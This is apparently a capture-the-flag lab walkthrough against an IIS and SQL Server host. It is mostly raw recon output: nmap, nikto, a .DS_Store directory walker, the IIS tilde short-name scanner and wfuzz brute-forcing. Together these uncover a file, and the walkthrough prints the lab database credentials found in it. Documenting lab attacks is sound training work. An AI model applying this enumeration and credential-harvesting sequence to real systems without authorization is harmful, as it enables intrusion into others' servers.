```shell
nmap -p- -T4 --min-rate 5000 -sC -sV -A -o poo -Pn 10.13.38.11
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-18 19:52 -03
Nmap scan report for 10.13.38.11
Host is up (0.24s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2027.00; RTM+
| ms-sql-ntlm-info: 
|   Target_Name: POO
|   NetBIOS_Domain_Name: POO
|   NetBIOS_Computer_Name: COMPATIBILITY
|   DNS_Domain_Name: intranet.poo
|   DNS_Computer_Name: COMPATIBILITY.intranet.poo
|   DNS_Tree_Name: intranet.poo
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-05-14T11:47:18
|_Not valid after:  2054-05-14T11:47:18
|_ssl-date: 2024-05-18T22:53:09+00:00; +5s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4s, deviation: 0s, median: 4s
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2027.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.82 seconds
```

```shell
http://10.13.38.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.13.38.11], Microsoft-IIS[10.0], Title[IIS Windows Server]
```

```shell
./nikto.pl -h http://10.13.38.11/                     
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.13.38.11
+ Target Hostname:    10.13.38.11
+ Target Port:        80
+ Start Time:         2024-05-18 20:35:04 (GMT-3)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ No creds found for realm 'COMPATIBILITY'
+ /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1446
2+ 8254 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2024-05-18 21:07:39 (GMT-3) (1955 seconds)
```

```shell
python3 scripts/ds_walk.py -u http://10.13.38.11
[!] .ds_store file is present on the webserver.
[+] Enumerating directories based on .ds_server file:
----------------------------
[!] http://10.13.38.11/admin
[!] http://10.13.38.11/dev
[!] http://10.13.38.11/iisstart.htm
[!] http://10.13.38.11/Images
[!] http://10.13.38.11/JS
[!] http://10.13.38.11/META-INF
[!] http://10.13.38.11/New folder
[!] http://10.13.38.11/New folder (2)
[!] http://10.13.38.11/Plugins
[!] http://10.13.38.11/Templates
[!] http://10.13.38.11/Themes
[!] http://10.13.38.11/Uploads
[!] http://10.13.38.11/web.config
[!] http://10.13.38.11/Widgets
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
----------------------------
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
[!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
----------------------------
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
[!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
----------------------------
[!] http://10.13.38.11/Images/buttons
[!] http://10.13.38.11/Images/icons
[!] http://10.13.38.11/Images/iisstart.png
----------------------------
[!] http://10.13.38.11/JS/custom
----------------------------
[!] http://10.13.38.11/Themes/default
----------------------------
[!] http://10.13.38.11/Widgets/CalendarEvents
[!] http://10.13.38.11/Widgets/Framework
[!] http://10.13.38.11/Widgets/Menu
[!] http://10.13.38.11/Widgets/Notifications
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts
----------------------------
[!] http://10.13.38.11/Widgets/Framework/Layouts/custom
[!] http://10.13.38.11/Widgets/Framework/Layouts/default
----------------------------
[*] Finished traversing. No remaining .ds_store files present.
[*] Cleaning up .ds_store files saved to disk.
```

```shell
[*] Scanning in progress...
[+] Found 5 directories
[+] http://10.13.38.11/ds_sto*~1
[+] http://10.13.38.11/newfol*~1
[+] http://10.13.38.11/newfol*~2
[+] http://10.13.38.11/templa*~1
[+] http://10.13.38.11/trashe*~1
[+] Found 1 files
[+] http://10.13.38.11/web*~1.con*
[*] Auxiliary module execution completed
```

```shell
msf6 auxiliary(scanner/http/iis_shortname_scanner) > set PATH dev/304c0c90fbc6520610abbf378e2339d1/db
PATH => dev/304c0c90fbc6520610abbf378e2339d1/db
msf6 auxiliary(scanner/http/iis_shortname_scanner) > run
[*] Running module against 10.13.38.11

[*] Scanning in progress...
[*] No directories were found
[+] Found 1 files
[+] http://10.13.38.11dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co*~1.txt*
[*] Auxiliary module execution completed
```

```shell
grep '^co.*' $HOME/Documents/Security/wordlists/raft-medium-directories.txt > co.txt
```

```shell
wfuzz --hc=404 -c -t 200 -w co.txt http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt
Total requests: 682

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                
=====================================================================

000000091:   200        6 L      7 W        142 Ch      "connection"                                           

Total time: 1.237479
Processed Requests: 682
Filtered Requests: 681
Requests/sec.: 551.1200
```

```shell
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#
```

## Links

- https://soroush.me/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1446